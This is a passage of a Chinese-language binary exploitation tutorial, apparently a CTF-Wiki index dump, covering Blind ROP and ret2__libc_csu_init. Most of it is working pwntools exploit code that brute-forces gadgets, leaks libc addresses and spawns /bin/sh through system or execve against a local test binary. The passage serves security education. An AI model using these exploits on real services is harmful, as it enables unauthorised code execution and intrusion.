\u786e\u5b9a\u6808\u6ea2\u51fa\u957f\u5ea6 \u00b6 def getbufferflow_length (): i = 1 while 1 : try : sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'WelCome my friend,Do you know password? \\n ' ) sh . send ( i * 'a' ) output = sh . recv () sh . close () if not output . startswith ( 'No password' ): return i - 1 else : i += 1 except EOFError : sh . close () return i - 1 \u6839\u636e\u4e0a\u9762\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\uff0c\u6808\u6ea2\u51fa\u7684\u957f\u5ea6\u4e3a72\u3002\u540c\u65f6\uff0c\u6839\u636e\u56de\u663e\u4fe1\u606f\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u5e76\u6ca1\u6709\u5f00\u542fcanary\u4fdd\u62a4\uff0c\u5426\u5219\uff0c\u5c31\u4f1a\u6709\u76f8\u5e94\u7684\u62a5\u9519\u5185\u5bb9\u3002\u6240\u4ee5\u6211\u4eec\u4e0d\u9700\u8981\u6267\u884cstack reading\u3002 \u5bfb\u627e stop gadgets \u00b6 \u5bfb\u627e\u8fc7\u7a0b\u5982\u4e0b def get_stop_addr ( length ): addr = 0x400000 while 1 : try : sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'password? \\n ' ) payload = 'a' * length + p64 ( addr ) sh . sendline ( payload ) sh . recv () sh . close () print 'one success addr: 0x %x ' % ( addr ) return addr except Exception : addr += 1 sh . close () \u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u5c1d\u8bd564\u4f4d\u7a0b\u5e8f\u6ca1\u6709\u5f00\u542fPIE\u7684\u60c5\u51b5\uff0c\u56e0\u4e3a\u4e00\u822c\u662f\u8fd9\u4e2a\u6837\u5b50\u7684\uff0c\uff0c\uff0c\u5982\u679c\u5f00\u542f\u4e86\uff0c\uff0c\u90a3\u5c31\u6309\u7167\u5f00\u542f\u4e86\u7684\u65b9\u6cd5\u505a\uff0c\uff0c\u7ed3\u679c\u53d1\u73b0\u4e86\u4e0d\u5c11\uff0c\uff0c\u6211\u9009\u62e9\u4e86\u4e00\u4e2a\u8c8c\u4f3c\u8fd4\u56de\u5230\u6e90\u7a0b\u5e8f\u4e2d\u7684\u5730\u5740 one success stop gadget addr: 0x4006b6 \u8bc6\u522bbrop gadgets \u00b6 \u4e0b\u9762\uff0c\u6211\u4eec\u6839\u636e\u4e0a\u9762\u4ecb\u7ecd\u7684\u539f\u7406\u6765\u5f97\u5230\u5bf9\u5e94\u7684brop gadgets\u5730\u5740\u3002\u6784\u9020\u5982\u4e0b\uff0cget_brop_gadget\u662f\u4e3a\u4e86\u5f97\u5230\u53ef\u80fd\u7684brop gadget\uff0c\u540e\u9762\u7684check_brop_gadget\u662f\u4e3a\u4e86\u68c0\u67e5\u3002 def get_brop_gadget ( length , stop_gadget , addr ): try : sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'password? \\n ' ) payload = 'a' * length + p64 ( addr ) + p64 ( 0 ) * 6 + p64 ( stop_gadget ) + p64 ( 0 ) * 10 sh . sendline ( payload ) content = sh . recv () sh . close () print content # stop gadget returns memory if not content . startswith ( 'WelCome' ): return False return True except Exception : sh . close () return False def check_brop_gadget ( length , addr ): try : sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'password? \\n ' ) payload = 'a' * length + p64 ( addr ) + 'a' * 8 * 10 sh . sendline ( payload ) content = sh . recv () sh . close () return False except Exception : sh . close () return True ##length = getbufferflow_length() length = 72 ##get_stop_addr(length) stop_gadget = 0x4006b6 addr = 0x400740 while 1 : print hex ( addr ) if get_brop_gadget ( length , stop_gadget , addr ): print 'possible brop gadget: 0x %x ' % addr if check_brop_gadget ( length , addr ): print 'success brop gadget: 0x %x ' % addr break addr += 1 \u8fd9\u6837\uff0c\u6211\u4eec\u57fa\u672c\u5f97\u5230\u4e86brop\u7684gadgets\u5730\u57400x4007ba \u786e\u5b9aputs@plt\u5730\u5740 \u00b6 \u6839\u636e\u4e0a\u9762\uff0c\u6240\u8bf4\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0bpayload\u6765\u8fdb\u884c\u83b7\u53d6 payload = 'A'*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget) \u5177\u4f53\u51fd\u6570\u5982\u4e0b def get_puts_addr ( length , rdi_ret , stop_gadget ): addr = 0x400000 while 1 : print hex ( addr ) sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'password? \\n ' ) payload = 'A' * length + p64 ( rdi_ret ) + p64 ( 0x400000 ) + p64 ( addr ) + p64 ( stop_gadget ) sh . sendline ( payload ) try : content = sh . recv () if content . startswith ( ' \\x7f ELF' ): print 'find puts@plt addr: 0x %x ' % addr return addr sh . close () addr += 1 except Exception : sh . close () addr += 1 \u6700\u540e\u6839\u636eplt\u7684\u7ed3\u6784\uff0c\u9009\u62e90x400560\u4f5c\u4e3aputs@plt \u6cc4\u9732puts@got\u5730\u5740 \u00b6 \u5728\u6211\u4eec\u53ef\u4ee5\u8c03\u7528puts\u51fd\u6570\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u6cc4\u9732puts\u51fd\u6570\u7684\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6libc\u7248\u672c\uff0c\u4ece\u800c\u83b7\u53d6\u76f8\u5173\u7684system\u51fd\u6570\u5730\u5740\u4e0e/bin/sh\u5730\u5740\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002\u6211\u4eec\u4ece0x400000\u5f00\u59cb\u6cc4\u97320x1000\u4e2a\u5b57\u8282\uff0c\u8fd9\u5df2\u7ecf\u8db3\u591f\u5305\u542b\u7a0b\u5e8f\u7684plt\u90e8\u5206\u4e86\u3002\u4ee3\u7801\u5982\u4e0b def leak ( length , rdi_ret , puts_plt , leak_addr , stop_gadget ): sh = remote ( '127.0.0.1' , 9999 ) payload = 'a' * length + p64 ( rdi_ret ) + p64 ( leak_addr ) + p64 ( puts_plt ) + p64 ( stop_gadget ) sh . recvuntil ( 'password? \\n ' ) sh . sendline ( payload ) try : data = sh . recv () sh . close () try : data = data [: data . index ( \" \\n WelCome\" )] except Exception : data = data if data == \"\" : data = ' \\x00 ' return data except Exception : sh . close () return None ##length = getbufferflow_length() length = 72 ##stop_gadget = get_stop_addr(length) stop_gadget = 0x4006b6 ##brop_gadget = find_brop_gadget(length,stop_gadget) brop_gadget = 0x4007ba rdi_ret = brop_gadget + 9 ##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget) puts_plt = 0x400560 addr = 0x400000 result = \"\" while addr < 0x401000 : print hex ( addr ) data = leak ( length , rdi_ret , puts_plt , addr , stop_gadget ) if data is None : continue else : result += data addr += len ( data ) with open ( 'code' , 'wb' ) as f : f . write ( result ) \u6700\u540e\uff0c\u6211\u4eec\u5c06\u6cc4\u9732\u7684\u5185\u5bb9\u5199\u5230\u6587\u4ef6\u91cc\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u5982\u679c\u6cc4\u9732\u51fa\u6765\u7684\u662f\u201c\u201d,\u90a3\u8bf4\u660e\u6211\u4eec\u9047\u5230\u4e86'\\x00'\uff0c\u56e0\u4e3aputs\u662f\u8f93\u51fa\u5b57\u7b26\u4e32\uff0c\u5b57\u7b26\u4e32\u662f\u4ee5'\\x00'\u4e3a\u7ec8\u6b62\u7b26\u7684\u3002\u4e4b\u540e\u5229\u7528ida\u6253\u5f00binary\u6a21\u5f0f\uff0c\u9996\u5148\u5728edit->segments->rebase program \u5c06\u7a0b\u5e8f\u7684\u57fa\u5730\u5740\u6539\u4e3a0x400000\uff0c\u7136\u540e\u627e\u5230\u504f\u79fb0x560\u5904\uff0c\u5982\u4e0b seg000: 0000000000400560 db 0 FFh seg000: 0000000000400561 db 25 h ; % seg000 : 0000000000400562 db 0 B2h ; seg000 : 0000000000400563 db 0 Ah seg000: 0000000000400564 db 20 h seg000: 0000000000400565 db 0 \u7136\u540e\u6309\u4e0bc,\u5c06\u6b64\u5904\u7684\u6570\u636e\u8f6c\u6362\u4e3a\u6c47\u7f16\u6307\u4ee4\uff0c\u5982\u4e0b seg000: 0000000000400560 ; --------------------------------------------------------------------------- seg000: 0000000000400560 jmp qword ptr cs : 601018 h seg000: 0000000000400566 ; --------------------------------------------------------------------------- seg000: 0000000000400566 push 0 seg000: 000000000040056 B jmp loc_400550 seg000: 000000000040056 B ; --------------------------------------------------------------------------- \u8fd9\u8bf4\u660e\uff0cputs@got\u7684\u5730\u5740\u4e3a0x601018\u3002 \u7a0b\u5e8f\u5229\u7528 \u00b6 ##length = getbufferflow_length() length = 72 ##stop_gadget = get_stop_addr(length) stop_gadget = 0x4006b6 ##brop_gadget = find_brop_gadget(length,stop_gadget) brop_gadget = 0x4007ba rdi_ret = brop_gadget + 9 ##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget) puts_plt = 0x400560 ##leakfunction(length, rdi_ret, puts_plt, stop_gadget) puts_got = 0x601018 sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'password? \\n ' ) payload = 'a' * length + p64 ( rdi_ret ) + p64 ( puts_got ) + p64 ( puts_plt ) + p64 ( stop_gadget ) sh . sendline ( payload ) data = sh . recvuntil ( ' \\n WelCome' , drop = True ) puts_addr = u64 ( data . ljust ( 8 , ' \\x00 ' )) libc = LibcSearcher ( 'puts' , puts_addr ) libc_base = puts_addr - libc . dump ( 'puts' ) system_addr = libc_base + libc . dump ( 'system' ) binsh_addr = libc_base + libc . dump ( 'str_bin_sh' ) payload = 'a' * length + p64 ( rdi_ret ) + p64 ( binsh_addr ) + p64 ( system_addr ) + p64 ( stop_gadget ) sh . sendline ( payload ) sh . interactive () \u53c2\u8003\u9605\u8bfb \u00b6 http://ytliu.info/blog/2014/09/28/blind-return-oriented-programming-brop-attack-gong-ji-yuan-li/ http://bobao.360.cn/learning/detail/3694.html http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/","title":"\u4e2d\u7ea7 ROP"},{"location":"pwn/stackoverflow/medium_rop/#rop","text":"\u4e2d\u7ea7 ROP \u4e3b\u8981\u662f\u4f7f\u7528\u4e86\u4e00\u4e9b\u6bd4\u8f83\u5de7\u5999\u7684 Gadgets\u3002","title":"\u4e2d\u7ea7ROP"},{"location":"pwn/stackoverflow/medium_rop/#ret2__libc_csu_init","text":"","title":"ret2__libc_csu_init"},{"location":"pwn/stackoverflow/medium_rop/#_1","text":"\u5728 64 \u4f4d\u7a0b\u5e8f\u4e2d\uff0c\u51fd\u6570\u7684\u524d 6 \u4e2a\u53c2\u6570\u662f\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u9012\u7684\uff0c\u4f46\u662f\u5927\u591a\u6570\u65f6\u5019\uff0c\u6211\u4eec\u5f88\u96be\u627e\u5230\u6bcf\u4e00\u4e2a\u5bc4\u5b58\u5668\u5bf9\u5e94\u7684gadgets\u3002 \u8fd9\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528 x64 \u4e0b\u7684 __libc_csu_init \u4e2d\u7684 gadgets\u3002\u8fd9\u4e2a\u51fd\u6570\u662f\u7528\u6765\u5bf9 libc \u8fdb\u884c\u521d\u59cb\u5316\u64cd\u4f5c\u7684\uff0c\u800c\u4e00\u822c\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8c03\u7528 libc \u51fd\u6570\uff0c\u6240\u4ee5\u8fd9\u4e2a\u51fd\u6570\u4e00\u5b9a\u4f1a\u5b58\u5728\u3002\u6211\u4eec\u5148\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u51fd\u6570(\u5f53\u7136\uff0c\u4e0d\u540c\u7248\u672c\u7684\u8fd9\u4e2a\u51fd\u6570\u6709\u4e00\u5b9a\u7684\u533a\u522b) .text: 00000000004005 C0 ; void _libc_csu_init(void) .text : 00000000004005 C0 public __libc_csu_init .text: 00000000004005 C0 __libc_csu_init proc near ; DATA XREF: _start+16\u0018o .text : 00000000004005 C0 push r15 .text: 00000000004005 C2 push r14 .text: 00000000004005 C4 mov r15d , edi .text: 00000000004005 C7 push r13 .text: 00000000004005 C9 push r12 .text: 00000000004005 CB lea r12 , __frame_dummy_init_array_entry .text: 00000000004005 D2 push rbp .text: 00000000004005 D3 lea rbp , __do_global_dtors_aux_fini_array_entry .text: 00000000004005 DA push rbx .text: 00000000004005 DB mov r14 , rsi .text: 00000000004005 DE mov r13 , rdx .text: 00000000004005 E1 sub rbp , r12 .text: 00000000004005 E4 sub rsp , 8 .text: 00000000004005 E8 sar rbp , 3 .text: 00000000004005 EC call _init_proc .text: 00000000004005 F1 test rbp , rbp .text: 00000000004005 F4 jz short loc_400616 .text: 00000000004005 F6 xor ebx , ebx .text: 00000000004005 F8 nop dword ptr [ rax + rax + 00000000 h ] .text: 0000000000400600 .text: 0000000000400600 loc_400600: ; CODE XREF: __libc_csu_init+54\u0019j .text: 0000000000400600 mov rdx , r13 .text: 0000000000400603 mov rsi , r14 .text: 0000000000400606 mov edi , r15d .text: 0000000000400609 call qword ptr [ r12 + rbx * 8 ] .text: 000000000040060 D add rbx , 1 .text: 0000000000400611 cmp rbx , rbp .text: 0000000000400614 jnz short loc_400600 .text: 0000000000400616 .text: 0000000000400616 loc_400616: ; CODE XREF: __libc_csu_init+34\u0018j .text: 0000000000400616 add rsp , 8 .text: 000000000040061 A pop rbx .text: 000000000040061 B pop rbp .text: 000000000040061 C pop r12 .text: 000000000040061 E pop r13 .text: 0000000000400620 pop r14 .text: 0000000000400622 pop r15 .text: 0000000000400624 retn .text: 0000000000400624 __libc_csu_init endp \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4ee5\u4e0b\u51e0\u70b9 \u4ece 0x000000000040061A \u4e00\u76f4\u5230\u7ed3\u5c3e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u6784\u9020\u6808\u4e0a\u6570\u636e\u6765\u63a7\u5236 rbx,rbp,r12,r13,r14,r15 \u5bc4\u5b58\u5668\u7684\u6570\u636e\u3002 \u4ece 0x0000000000400600 \u5230 0x0000000000400609\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06 r13 \u8d4b\u7ed9 rdx,\u5c06 r14 \u8d4b\u7ed9 rsi\uff0c\u5c06 r15d \u8d4b\u7ed9 edi\uff08\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u867d\u7136\u8fd9\u91cc\u8d4b\u7ed9\u7684\u662f edi\uff0c \u4f46\u5176\u5b9e\u6b64\u65f6 rdi \u7684\u9ad8 32 \u4f4d\u5bc4\u5b58\u5668\u503c\u4e3a 0\uff08\u81ea\u884c\u8c03\u8bd5\uff09 \uff0c\u6240\u4ee5\u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 rdi \u5bc4\u5b58\u5668\u7684\u503c\uff0c\u53ea\u4e0d\u8fc7\u53ea\u80fd\u63a7\u5236\u4f4e 32 \u4f4d\uff09\uff0c\u800c\u8fd9\u4e09\u4e2a\u5bc4\u5b58\u5668\uff0c\u4e5f\u662f x64 \u51fd\u6570\u8c03\u7528\u4e2d\u4f20\u9012\u7684\u524d\u4e09\u4e2a\u5bc4\u5b58\u5668\u3002\u6b64\u5916\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u5408\u7406\u5730\u63a7\u5236 r12 \u4e0e rbx\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u8c03\u7528\u6211\u4eec\u60f3\u8981\u8c03\u7528\u7684\u51fd\u6570\u3002\u6bd4\u5982\u8bf4\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 rbx \u4e3a 0\uff0cr12 \u4e3a\u5b58\u50a8\u6211\u4eec\u60f3\u8981\u8c03\u7528\u7684\u51fd\u6570\u7684\u5730\u5740\u3002 \u4ece 0x000000000040060D \u5230 0x0000000000400614\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 rbx \u4e0e rbp \u7684\u4e4b\u95f4\u7684\u5173\u7cfb\u4e3arbx+1 = rbp\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u4e0d\u4f1a\u6267\u884c loc_400600\uff0c\u8fdb\u800c\u53ef\u4ee5\u7ee7\u7eed\u6267\u884c\u4e0b\u9762\u7684\u6c47\u7f16\u7a0b\u5e8f\u3002\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u7684\u8bbe\u7f6erbx=0\uff0crbp=1\u3002","title":"\u539f\u7406"},{"location":"pwn/stackoverflow/medium_rop/#_2","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5\u84b8\u7c73\u7684\u4e00\u6b65\u4e00\u6b65\u5b66 ROP \u4e4b linux_x64 \u7bc7\u4e2d level5 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u9996\u5148\u68c0\u67e5\u7a0b\u5e8f\u7684\u5b89\u5168\u4fdd\u62a4 \u279c ret2__libc_csu_init git: ( iromise ) \u2717 checksec level5 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u7a0b\u5e8f\u4e3a 64 \u4f4d\uff0c\u5f00\u542f\u4e86\u5806\u6808\u4e0d\u53ef\u6267\u884c\u4fdd\u62a4\u3002 \u5176\u6b21\uff0c\u5bfb\u627e\u7a0b\u5e8f\u7684\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e2d\u6709\u4e00\u4e2a\u7b80\u5355\u7684\u6808\u6ea2\u51fa ssize_t vulnerable_function () { char buf ; // [sp+0h] [bp-80h]@1 return read ( 0 , & buf , 0x200uLL ); } \u7b80\u5355\u6d4f\u89c8\u4e0b\u7a0b\u5e8f\uff0c\u53d1\u73b0\u7a0b\u5e8f\u4e2d\u65e2\u6ca1\u6709 system \u51fd\u6570\u5730\u5740\uff0c\u4e5f\u6ca1\u6709 /bin/sh \u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u4e24\u8005\u90fd\u9700\u8981\u6211\u4eec\u81ea\u5df1\u53bb\u6784\u9020\u4e86\u3002 \u6ce8\uff1a\u8fd9\u91cc\u6211\u5c1d\u8bd5\u5728\u6211\u672c\u673a\u4f7f\u7528 system \u51fd\u6570\u6765\u83b7\u53d6 shell \u5931\u8d25\u4e86\uff0c\u5e94\u8be5\u662f\u73af\u5883\u53d8\u91cf\u7684\u95ee\u9898\uff0c\u6240\u4ee5\u8fd9\u91cc\u4f7f\u7528\u7684\u662fexecve \u6765\u83b7\u53d6 shell\u3002 \u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u5229\u7528\u6808\u6ea2\u51fa\u6267\u884c libc_csu_gadgets \u83b7\u53d6 write \u51fd\u6570\u5730\u5740\uff0c\u5e76\u4f7f\u5f97\u7a0b\u5e8f\u91cd\u65b0\u6267\u884c main \u51fd\u6570 \u6839\u636e libcsearcher \u83b7\u53d6\u5bf9\u5e94 libc \u7248\u672c\u4ee5\u53ca execve \u51fd\u6570\u5730\u5740 \u518d\u6b21\u5229\u7528\u6808\u6ea2\u51fa\u6267\u884c libc_csu_gadgets \u5411 bss \u6bb5\u5199\u5165 execve \u5730\u5740\u4ee5\u53ca '/bin/sh\u2019 \u5730\u5740\uff0c\u5e76\u4f7f\u5f97\u7a0b\u5e8f\u91cd\u65b0\u6267\u884cmain \u51fd\u6570\u3002 \u518d\u6b21\u5229\u7528\u6808\u6ea2\u51fa\u6267\u884c libc_csu_gadgets \u6267\u884c execve('/bin/sh') \u83b7\u53d6 shell\u3002 exp \u5982\u4e0b from pwn import * from LibcSearcher import LibcSearcher #context.log_level = 'debug' level5 = ELF ( './level5' ) sh = process ( './level5' ) write_got = level5 . got [ 'write' ] read_got = level5 . got [ 'read' ] main_addr = level5 . symbols [ 'main' ] bss_base = level5 . bss () csu_front_addr = 0x0000000000400600 csu_end_addr = 0x000000000040061A fakeebp = 'b' * 8 def csu ( rbx , rbp , r12 , r13 , r14 , r15 , last ): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = 'a' * 0x80 + fakeebp payload += p64 ( csu_end_addr ) + p64 ( rbx ) + p64 ( rbp ) + p64 ( r12 ) + p64 ( r13 ) + p64 ( r14 ) + p64 ( r15 ) payload += p64 ( csu_front_addr ) payload += 'a' * 0x38 payload += p64 ( last ) sh . send ( payload ) sleep ( 1 ) sh . recvuntil ( 'Hello, World \\n ' ) ## RDI, RSI, RDX, RCX, R8, R9, more on the stack ## write(1,write_got,8) csu ( 0 , 1 , write_got , 8 , write_got , 1 , main_addr ) write_addr = u64 ( sh . recv ( 8 )) libc = LibcSearcher ( 'write' , write_addr ) libc_base = write_addr - libc . dump ( 'write' ) execve_addr = libc_base + libc . dump ( 'execve' ) log . success ( 'execve_addr ' + hex ( execve_addr )) ##gdb.attach(sh) ## read(0,bss_base,16) ## read execve_addr and /bin/sh\\x00 sh . recvuntil ( 'Hello, World \\n ' ) csu ( 0 , 1 , read_got , 16 , bss_base , 0 , main_addr ) sh . send ( p64 ( execve_addr ) + '/bin/sh \\x00 ' ) sh . recvuntil ( 'Hello, World \\n ' ) ## execve(bss_base+8) csu ( 0 , 1 , bss_base , 0 , 0 , bss_base + 8 , main_addr ) sh . interactive ()","title":"\u793a\u4f8b"},{"location":"pwn/stackoverflow/medium_rop/#_3","text":"","title":"\u601d\u8003"},{"location":"pwn/stackoverflow/medium_rop/#_4","text":"\u5728\u4e0a\u9762\u7684\u65f6\u5019\uff0c\u6211\u4eec\u76f4\u63a5\u5229\u7528\u4e86\u8fd9\u4e2a\u901a\u7528 gadgets\uff0c\u5176\u8f93\u5165\u7684\u5b57\u8282\u957f\u5ea6\u4e3a 128\u3002\u4f46\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u7a0b\u5e8f\u6f0f\u6d1e\u90fd\u53ef\u4ee5\u8ba9\u6211\u4eec\u8f93\u5165\u8fd9\u4e48\u957f\u7684\u5b57\u8282\u3002\u90a3\u4e48\u5f53\u5141\u8bb8\u6211\u4eec\u8f93\u5165\u7684\u5b57\u8282\u6570\u8f83\u5c11\u7684\u65f6\u5019\uff0c\u6211\u4eec\u8be5\u600e\u4e48\u6709\u4ec0\u4e48\u529e\u6cd5\u5462\uff1f\u4e0b\u9762\u7ed9\u51fa\u4e86\u51e0\u4e2a\u65b9\u6cd5","title":"\u6539\u8fdb"},{"location":"pwn/stackoverflow/medium_rop/#1-rbx-rbp","text":"\u53ef\u4ee5\u770b\u5230\u5728\u6211\u4eec\u4e4b\u524d\u7684\u5229\u7528\u4e2d\uff0c\u6211\u4eec\u5229\u7528\u8fd9\u4e24\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\u7684\u4e3b\u8981\u662f\u4e3a\u4e86\u6ee1\u8db3 cmp \u7684\u6761\u4ef6\uff0c\u5e76\u8fdb\u884c\u8df3\u8f6c\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63d0\u524d\u63a7\u5236\u8fd9\u4e24\u4e2a\u6570\u503c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u51cf\u5c11 16 \u5b57\u8282\uff0c\u5373\u6211\u4eec\u6240\u9700\u7684\u5b57\u8282\u6570\u53ea\u9700\u8981112\u3002","title":"\u6539\u8fdb1 - \u63d0\u524d\u63a7\u5236 rbx \u4e0e rbp"},{"location":"pwn/stackoverflow/medium_rop/#2-","text":"\u5176\u5b9e\uff0c\u6539\u8fdb 1 \u4e5f\u7b97\u662f\u4e00\u79cd\u591a\u6b21\u5229\u7528\u3002\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684 gadgets \u662f\u5206\u4e3a\u4e24\u90e8\u5206\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u5176\u5b9e\u53ef\u4ee5\u8fdb\u884c\u4e24\u6b21\u8c03\u7528\u6765\u8fbe\u5230\u7684\u76ee\u7684\uff0c\u4ee5\u4fbf\u4e8e\u51cf\u5c11\u4e00\u6b21 gadgets \u6240\u9700\u8981\u7684\u5b57\u8282\u6570\u3002\u4f46\u8fd9\u91cc\u7684\u591a\u6b21\u5229\u7528\u9700\u8981\u66f4\u52a0\u4e25\u683c\u7684\u6761\u4ef6 \u6f0f\u6d1e\u53ef\u4ee5\u88ab\u591a\u6b21\u89e6\u53d1 \u5728\u4e24\u6b21\u89e6\u53d1\u4e4b\u95f4\uff0c\u7a0b\u5e8f\u5c1a\u672a\u4fee\u6539 r12-r15 \u5bc4\u5b58\u5668\uff0c\u8fd9\u662f\u56e0\u4e3a\u8981\u4e24\u6b21\u8c03\u7528\u3002 \u5f53\u7136\uff0c\u6709\u65f6\u5019\u6211\u4eec\u4e5f\u4f1a\u9047\u5230\u4e00\u6b21\u6027\u53ef\u4ee5\u8bfb\u5165\u5927\u91cf\u7684\u5b57\u8282\uff0c\u4f46\u662f\u4e0d\u5141\u8bb8\u6f0f\u6d1e\u518d\u6b21\u5229\u7528\u7684\u60c5\u51b5\uff0c\u8fd9\u65f6\u5019\u5c31\u9700\u8981\u6211\u4eec\u4e00\u6b21\u6027\u5c06\u6240\u6709\u7684\u5b57\u8282\u5e03\u7f6e\u597d\uff0c\u4e4b\u540e\u6162\u6162\u5229\u7528\u3002","title":"\u6539\u8fdb2-\u591a\u6b21\u5229\u7528"},{"location":"pwn/stackoverflow/medium_rop/#gadget","text":"\u5176\u5b9e\uff0c\u9664\u4e86\u4e0a\u8ff0\u8fd9\u4e2agadgets\uff0cgcc\u9ed8\u8ba4\u8fd8\u4f1a\u7f16\u8bd1\u8fdb\u53bb\u4e00\u4e9b\u5176\u5b83\u7684\u51fd\u6570 _init _start call_gmon_start deregister_tm_clones register_tm_clones __do_global_dtors_aux frame_dummy __libc_csu_init __libc_csu_fini _fini \u6211\u4eec\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u5229\u7528\u5176\u4e2d\u7684\u4e00\u4e9b\u4ee3\u7801\u6765\u8fdb\u884c\u6267\u884c\u3002\u6b64\u5916\uff0c\u7531\u4e8e PC \u672c\u8eab\u53ea\u662f\u5c06\u7a0b\u5e8f\u7684\u6267\u884c\u5730\u5740\u5904\u7684\u6570\u636e\u4f20\u9012\u7ed9CPU\uff0c\u800c CPU \u5219\u53ea\u662f\u5bf9\u4f20\u9012\u6765\u7684\u6570\u636e\u8fdb\u884c\u89e3\u7801\uff0c\u53ea\u8981\u89e3\u7801\u6210\u529f\uff0c\u5c31\u4f1a\u8fdb\u884c\u6267\u884c\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5c06\u6e90\u7a0b\u5e8f\u4e2d\u4e00\u4e9b\u5730\u5740\u8fdb\u884c\u504f\u79fb\u4ece\u800c\u6765\u83b7\u53d6\u6211\u4eec\u6240\u60f3\u8981\u7684\u6307\u4ee4\uff0c\u53ea\u8981\u53ef\u4ee5\u786e\u4fdd\u7a0b\u5e8f\u4e0d\u5d29\u6e83\u3002 \u9700\u8981\u4e00\u8bf4\u7684\u662f\uff0c\u5728\u4e0a\u9762\u7684 libc_csu_init \u4e2d\u6211\u4eec\u4e3b\u8981\u5229\u7528\u4e86\u4ee5\u4e0b\u5bc4\u5b58\u5668 \u5229\u7528\u5c3e\u90e8\u4ee3\u7801\u63a7\u5236\u4e86rbx\uff0crbp\uff0cr12\uff0cr13\uff0cr14\uff0cr15\u3002 \u5229\u7528\u4e2d\u95f4\u90e8\u5206\u7684\u4ee3\u7801\u63a7\u5236\u4e86rdx\uff0crsi\uff0cedi\u3002 \u800c\u5176\u5b9e libc_csu_init \u7684\u5c3e\u90e8\u901a\u8fc7\u504f\u79fb\u662f\u53ef\u4ee5\u63a7\u5236\u5176\u4ed6\u5bc4\u5b58\u5668\u7684\u3002\u5176\u4e2d\uff0c0x000000000040061A \u662f\u6b63\u5e38\u7684\u8d77\u59cb\u5730\u5740\uff0c \u53ef\u4ee5\u770b\u5230\u6211\u4eec\u5728 0x000000000040061f \u5904\u53ef\u4ee5\u63a7\u5236 rbp \u5bc4\u5b58\u5668\uff0c\u57280x0000000000400621 \u5904\u53ef\u4ee5\u63a7\u5236 rsi\u5bc4\u5b58\u5668\u3002 \u800c\u5982\u679c\u60f3\u8981\u6df1\u5165\u5730\u4e86\u89e3\u8fd9\u4e00\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u5c31\u8981\u5bf9\u6c47\u7f16\u6307\u4ee4\u4e2d\u7684\u6bcf\u4e2a\u5b57\u6bb5\u8fdb\u884c\u66f4\u52a0\u900f\u5f7b\u5730\u7406\u89e3\u3002\u5982\u4e0b\u3002 gef \u27a4 x / 5 i 0x000000000040061A 0 x40061a < __libc_csu_init + 90 > : pop rbx 0 x40061b < __libc_csu_init + 91 > : pop rbp 0 x40061c < __libc_csu_init + 92 > : pop r12 0 x40061e < __libc_csu_init + 94 > : pop r13 0 x400620 < __libc_csu_init + 96 > : pop r14 gef \u27a4 x / 5 i 0x000000000040061b 0 x40061b < __libc_csu_init + 91 > : pop rbp 0 x40061c < __libc_csu_init + 92 > : pop r12 0 x40061e < __libc_csu_init + 94 > : pop r13 0 x400620 < __libc_csu_init + 96 > : pop r14 0 x400622 < __libc_csu_init + 98 > : pop r15 gef \u27a4 x / 5 i 0x000000000040061A + 3 0 x40061d < __libc_csu_init + 93 > : pop rsp 0 x40061e < __libc_csu_init + 94 > : pop r13 0 x400620 < __libc_csu_init + 96 > : pop r14 0 x400622 < __libc_csu_init + 98 > : pop r15 0 x400624 < __libc_csu_init + 100 > : ret gef 